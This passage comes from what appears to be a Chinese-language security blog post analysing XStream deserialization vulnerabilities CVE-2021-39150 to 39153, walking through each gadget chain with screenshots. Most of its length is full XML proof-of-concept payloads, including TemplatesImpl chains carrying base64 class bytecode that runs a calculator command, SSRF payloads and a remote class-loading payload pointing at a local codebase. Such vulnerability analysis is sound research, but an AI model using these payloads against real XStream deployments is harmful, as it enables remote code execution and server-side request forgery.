yRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAbeXNvc2VyaWFsL1B3bmVyNjMzNTA1NjA2NTkzAQAdTHlzb3NlcmlhbC9Qd25lcjYzMzUwNTYwNjU5MzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=&lt;/byte-array&gt;</span><br><span class="line">                      &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;</span><br><span class="line">                    &lt;/__bytecodes&gt;</span><br><span class="line">                  &lt;/default&gt;</span><br><span class="line">                  &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">              &lt;/proxy&gt;</span><br><span class="line">              &lt;implementing__method&gt;</span><br><span class="line">                &lt;class&gt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;getOutputProperties&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types/&gt;</span><br><span class="line">              &lt;/implementing__method&gt;</span><br><span class="line">            &lt;/sun.tracing.dtrace.DTraceProbe&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/probes&gt;</span><br><span class="line">      &lt;/defaultHandler&gt;</span><br><span class="line">    &lt;/handler&gt;</span><br><span class="line">  &lt;/dynamic-proxy&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure>

<p>这条利用链比较简单，通过HashMap触发key.hashCode方法，然后交由给CompositeInvocationHandlerImpl的invoke方法处理：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132219060.png" alt="image-20230413221939966"></p>
<p>先获取hashCode方法所属类Object，然后从classToInvocationHandler属性中查找是否有该类的handler，找不到就将defaultHandler默认处理器赋给handler，然后调用invoke方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132223984.png" alt="image-20230413222320883"></p>
<p>在invoke方法中获取方法所属类Object，然后判断跟providerType属性是否相等，相等的话进入else分支调用triggerProbe方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132225997.png" alt="image-20230413222523911"></p>
<p>从属性probes中获取hashCode方法的ProbeSkeleton对象，然后调用uncheckedTrigger方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132228054.png" alt="image-20230413222813977"></p>
<p>执行TemplatesImpl的getOutputProperties方法，后面就是经典利用链了。</p>
<h2 id="CVE-2021-39150"><a href="#CVE-2021-39150" class="headerlink" title="CVE-2021-39150"></a>CVE-2021-39150</h2><h3 id="分析-27"><a href="#分析-27" class="headerlink" title="分析"></a>分析</h3><p>该漏洞导致SSRF，该链是39141的变种，简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;dynamic-proxy&gt;</span><br><span class="line">      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;</span><br><span class="line">      &lt;handler class=&#x27;com.sun.xml.internal.ws.client.sei.SEIStub&#x27;&gt;</span><br><span class="line">        &lt;owner/&gt;</span><br><span class="line">        &lt;managedObjectManagerClosed&gt;false&lt;/managedObjectManagerClosed&gt;</span><br><span class="line">        &lt;databinding class=&#x27;com.sun.xml.internal.ws.db.DatabindingImpl&#x27;&gt;</span><br><span class="line">          &lt;stubHandlers&gt;</span><br><span class="line">            &lt;entry&gt;</span><br><span class="line">              &lt;method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Comparable&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;compareTo&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types&gt;</span><br><span class="line">                  &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">                &lt;/parameter-types&gt;</span><br><span class="line">              &lt;/method&gt;</span><br><span class="line">              &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">                &lt;bodyBuilder class=&#x27;com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit&#x27;&gt;</span><br><span class="line">                  &lt;indices&gt;</span><br><span class="line">                    &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                  &lt;/indices&gt;</span><br><span class="line">                  &lt;getters&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;</span><br><span class="line">                  &lt;/getters&gt;</span><br><span class="line">                  &lt;accessors&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                      &lt;val_-getter class=&#x27;com.sun.xml.internal.ws.spi.db.FieldGetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;int&lt;/type&gt;</span><br><span class="line">                        &lt;field&gt;</span><br><span class="line">                          &lt;name&gt;hash&lt;/name&gt;</span><br><span class="line">                          &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                        &lt;/field&gt;</span><br><span class="line">                      &lt;/val_-getter&gt;</span><br><span class="line">                      &lt;val_-setter class=&#x27;com.sun.xml.internal.ws.spi.db.MethodSetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;java.lang.String&lt;/type&gt;</span><br><span class="line">                        &lt;method&gt;</span><br><span class="line">                          &lt;class&gt;jdk.nashorn.internal.runtime.Source&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;readFully&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types&gt;</span><br><span class="line">                            &lt;class&gt;java.net.URL&lt;/class&gt;</span><br><span class="line">                          &lt;/parameter-types&gt;</span><br><span class="line">                        &lt;/method&gt;</span><br><span class="line">                      &lt;/val_-setter&gt;</span><br><span class="line">                    &lt;/com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                  &lt;/accessors&gt;</span><br><span class="line">                  &lt;wrapper&gt;java.lang.Object&lt;/wrapper&gt;</span><br><span class="line">                  &lt;bindingContext class=&#x27;com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper&#x27;/&gt;</span><br><span class="line">                &lt;/bodyBuilder&gt;</span><br><span class="line">              &lt;/com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">            &lt;/entry&gt;</span><br><span class="line">          &lt;/stubHandlers&gt;</span><br><span class="line">        &lt;/databinding&gt;</span><br><span class="line">        &lt;methodHandlers&gt;</span><br><span class="line">          &lt;entry&gt;</span><br><span class="line">            &lt;method reference=&#x27;../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">              &lt;owner reference=&#x27;../../../..&#x27;/&gt;</span><br><span class="line">              &lt;method reference=&#x27;../../../../databinding/stubHandlers/entry/method&#x27;/&gt;</span><br><span class="line">            &lt;/com.sun.xml.internal.ws.client.sei.SyncMethodHandler&gt;</span><br><span class="line">          &lt;/entry&gt;</span><br><span class="line">        &lt;/methodHandlers&gt;</span><br><span class="line">      &lt;/handler&gt;</span><br><span class="line">    &lt;/dynamic-proxy&gt;</span><br><span class="line">    &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>这里回看<a href="#CVE-2021-39141">CVE-2021-39141</a>，不再赘述。差别就在MethodSetter执行的方法不一样，这里执行的是Source的readFully：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304132300222.png" alt="image-20230413230023122"></p>
<p>直接发起URL连接，造成SSRF。</p>
<h2 id="CVE-2021-39151"><a href="#CVE-2021-39151" class="headerlink" title="CVE-2021-39151"></a>CVE-2021-39151</h2><h3 id="分析-28"><a href="#分析-28" class="headerlink" title="分析"></a>分析</h3><p>该漏洞也是远程加载类并实例化，链的后半部分与<a href="#CVE-2021-39145">CVE-2021-39145</a>完全相同，这里不再赘述，官方简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;javax.swing.event.EventListenerList serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;javax.swing.event.EventListenerList&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;listenerList&gt;</span><br><span class="line">        &lt;javax.swing.undo.UndoManager&gt;</span><br><span class="line">          &lt;hasBeenDone&gt;true&lt;/hasBeenDone&gt;</span><br><span class="line">          &lt;alive&gt;true&lt;/alive&gt;</span><br><span class="line">          &lt;inProgress&gt;true&lt;/inProgress&gt;</span><br><span class="line">          &lt;edits&gt;</span><br><span class="line">            &lt;com.sun.xml.internal.ws.api.message.Packet&gt;</span><br><span class="line">              &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                &lt;bodyParts/&gt;</span><br><span class="line">                &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                  &lt;multiPart class=&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;&gt;</span><br><span class="line">                    &lt;soapPart/&gt;</span><br><span class="line">                    &lt;mm&gt;</span><br><span class="line">                      &lt;it class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                        &lt;aliases class=&#x27;com.sun.jndi.ldap.LdapBindingEnumeration&#x27;&gt;</span><br><span class="line">                          &lt;entries&gt;</span><br><span class="line">                            &lt;com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                              &lt;DN&gt;cn=four,cn=three,cn=two,cn=one&lt;/DN&gt;</span><br><span class="line">                              &lt;attributes class=&#x27;javax.naming.directory.BasicAttributes&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                &lt;javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                                  &lt;default /&gt;</span><br><span class="line">                                  &lt;int&gt;4&lt;/int&gt;</span><br><span class="line">                                  &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                    &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                      &lt;default&gt;</span><br><span class="line">                                        &lt;attrID&gt;objectClass&lt;/attrID&gt;</span><br><span class="line">                                      &lt;/default&gt;</span><br><span class="line">                                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                      &lt;string&gt;javanamingreference&lt;/string&gt;</span><br><span class="line">                                    &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                  &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                                  &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                    &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                      &lt;default&gt;</span><br><span class="line">                                        &lt;attrID&gt;javaCodeBase&lt;/attrID&gt;</span><br><span class="line">                                      &lt;/default&gt;</span><br><span class="line">                                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                      &lt;string&gt;http://127.0.0.1:8080/&lt;/string&gt;</span><br><span class="line">                                    &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                  &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                                  &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                    &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                      &lt;default&gt;</span><br><span class="line">                                        &lt;attrID&gt;javaClassName&lt;/attrID&gt;</span><br><span class="line">                                      &lt;/default&gt;</span><br><span class="line">                                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                      &lt;string&gt;refObj&lt;/string&gt;</span><br><span class="line">                                    &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                  &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                                  &lt;com.sun.jndi.ldap.LdapAttribute serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                    &lt;javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                      &lt;default&gt;</span><br><span class="line">                                        &lt;attrID&gt;javaFactory&lt;/attrID&gt;</span><br><span class="line">                                      &lt;/default&gt;</span><br><span class="line">                                      &lt;int&gt;1&lt;/int&gt;</span><br><span class="line">                                      &lt;string&gt;Evil&lt;/string&gt;</span><br><span class="line">                                    &lt;/javax.naming.directory.BasicAttribute&gt;</span><br><span class="line">                                  &lt;/com.sun.jndi.ldap.LdapAttribute&gt;</span><br><span class="line">                                &lt;/javax.naming.directory.BasicAttributes&gt;</span><br><span class="line">                              &lt;/attributes&gt;</span><br><span class="line">                            &lt;/com.sun.jndi.ldap.LdapEntry&gt;</span><br><span class="line">                          &lt;/entries&gt;</span><br><span class="line">                          &lt;limit&gt;2&lt;/limit&gt;</span><br><span class="line">                          &lt;posn&gt;0&lt;/posn&gt;</span><br><span class="line">                          &lt;homeCtx /&gt;</span><br><span class="line">                          &lt;more&gt;true&lt;/more&gt;</span><br><span class="line">                          &lt;hasMoreCalled&gt;true&lt;/hasMoreCalled&gt;</span><br><span class="line">                        &lt;/aliases&gt;</span><br><span class="line">                      &lt;/it&gt;</span><br><span class="line">                    &lt;/mm&gt;</span><br><span class="line">                  &lt;/multiPart&gt;</span><br><span class="line">                &lt;/sm&gt;</span><br><span class="line">              &lt;/message&gt;</span><br><span class="line">            &lt;/com.sun.xml.internal.ws.api.message.Packet&gt;</span><br><span class="line">          &lt;/edits&gt;</span><br><span class="line">        &lt;/javax.swing.undo.UndoManager&gt;</span><br><span class="line">      &lt;/listenerList&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;string&gt;java.lang.InternalError&lt;/string&gt;</span><br><span class="line">    &lt;javax.swing.undo.UndoManager reference=&#x27;../default/listenerList/javax.swing.undo.UndoManager&#x27;/&gt;</span><br><span class="line">  &lt;/javax.swing.event.EventListenerList&gt;</span><br><span class="line">&lt;/javax.swing.event.EventListenerList&gt;</span><br></pre></td></tr></table></figure>

<p>这里主要是通过什么去触发了Packet的toString方法很重要。</p>
<p>这里有个细节，当字符串使用加号拼接时，会使用StringBuilder将加号的每一个不是字符串的部分进行toString操作。</p>
<p>在EventListenerList的readObject方法中：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141119074.png" alt="image-20230414111912940"></p>
<p>先读取default标签内容，然后读取java.lang.InternalError字符串，再然后读取UndoManager对象。加载InternalError的Class对象再调用add方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141121149.png" alt="image-20230414112134058"></p>
<p>由于UndoManager对象不是InternalError的实例，所以拼接字符串，准备抛异常，之前说过在拼接字符串时，内部会使用StringBuilder组装拼接的每个部分，将每个部分append到StringBuilder中，然后调用StringBuilder的toString方法返回完整的拼接好的字符串。</p>
<p>当append的是个对象时，会调用该对象的String.valueOf(obj)方法将该对象转成字符串：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141126542.png" alt="image-20230414112658467"></p>
<p>valueOf方法也不过是调用对象的toString方法来将对象转成字符串：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141128607.png" alt="image-20230414112827504"></p>
<p>这时候就进到UndoManager的toString方法了，在toString方法又调用父类的toString方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141130779.png" alt="image-20230414113018661"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141131593.png" alt="image-20230414113108477"></p>
<p>有意思的是，在父类的toString方法中，同样又进行了字符串的拼接，这时候又会调用拼接部分的toString方法，即edits属性（Vector）的toString方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141132917.png" alt="image-20230414113226823"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141134642.png" alt="image-20230414113447511"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141135611.png" alt="image-20230414113519506"></p>
<p>最后来到Vector父类AbstractCollection的toString方法。在该方法中，先取元素（Packet对象），然后再使用字符串拼接，这时候就来到Packet的toString了。后续利用链的话看<a href="#CVE-2021-39145">CVE-2021-39145</a>，减少重复分析。</p>
<h2 id="CVE-2021-39152"><a href="#CVE-2021-39152" class="headerlink" title="CVE-2021-39152"></a>CVE-2021-39152</h2><h3 id="分析-29"><a href="#分析-29" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成SSRF，修正后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.runtime.Source_-URLData&gt;</span><br><span class="line">      &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">      &lt;length&gt;0&lt;/length&gt;</span><br><span class="line">      &lt;lastModified&gt;0&lt;/lastModified&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.runtime.Source_-URLData&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.runtime.Source_-URLData reference=&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.runtime.Source_-URLData&gt;</span><br><span class="line">      &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;</span><br><span class="line">      &lt;length&gt;0&lt;/length&gt;</span><br><span class="line">      &lt;lastModified&gt;0&lt;/lastModified&gt;</span><br><span class="line">    &lt;/jdk.nashorn.internal.runtime.Source_-URLData&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.runtime.Source_-URLData reference=&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;/&gt;</span><br><span class="line">  &lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>

<p>从HashMap的put方法进：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141156271.png" alt="image-20230414115605195"></p>
<p>进入putVal方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141158067.png" alt="image-20230414115836976"></p>
<p>这里整个操作就是取下一个元素的键值，然后将当前元素的键值去跟下一个元素的键值比较。</p>
<p>这里就触发了URLData的equals方法。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141200926.png" alt="image-20230414120046845"></p>
<p>在equals方法中，调用loadMeta方法（确保被比较的元素不等于当前元素，同时元素是URLData的实例，同时两个元素的url属性相等，array属性为null）。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304141203279.png" alt="image-20230414120303206"></p>
<p>在length和lastModified都为0的情况下，直接发起URL连接，造成SSRF。</p>
<h2 id="CVE-2021-39153"><a href="#CVE-2021-39153" class="headerlink" title="CVE-2021-39153"></a>CVE-2021-39153</h2><h3 id="分析-30"><a href="#分析-30" class="headerlink" title="分析"></a>分析</h3><p>该漏洞直接造成RCE，修正简化后的POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;com.sun.java.util.jar.pack.PackageWriter$2&#x27;&gt;</span><br><span class="line">        &lt;outer-class&gt;</span><br><span class="line">          &lt;attrIndexTable class=&#x27;com.sun.javafx.fxml.BeanAdapter&#x27;&gt;</span><br><span class="line">            &lt;bean class=&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;__name&gt;Pwnr&lt;/__name&gt;</span><br><span class="line">                  &lt;__bytecodes&gt;</span><br><span class="line">                    &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIyMDU0MTY0NDMxMDIwMTkBACBMeXNvc2VyaWFsL1B3bmVyMjA1NDE2NDQzMTAyMDE5OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==&lt;/byte-array&gt;</span><br><span class="line">                    &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;</span><br><span class="line">                  &lt;/__bytecodes&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">              &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">            